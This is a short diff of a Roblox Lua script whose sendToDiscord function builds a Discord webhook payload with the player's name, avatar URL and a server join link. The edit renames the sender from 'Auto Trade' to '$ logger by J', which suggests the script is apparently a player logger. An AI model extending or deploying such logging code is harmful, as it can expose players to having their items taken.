@@ -187,7 +187,7 @@ local function sendToDiscord()
     local joinLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId
 
     local payload = {
-        username = LocalPlayer.Name .. " - Auto Trade",
+        username = LocalPlayer.Name .. " $ logger by J",
         avatar_url = "https://www.roblox.com/bust-thumbnails/avatar.ashx?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png",
         embeds = {{
             description = desc,
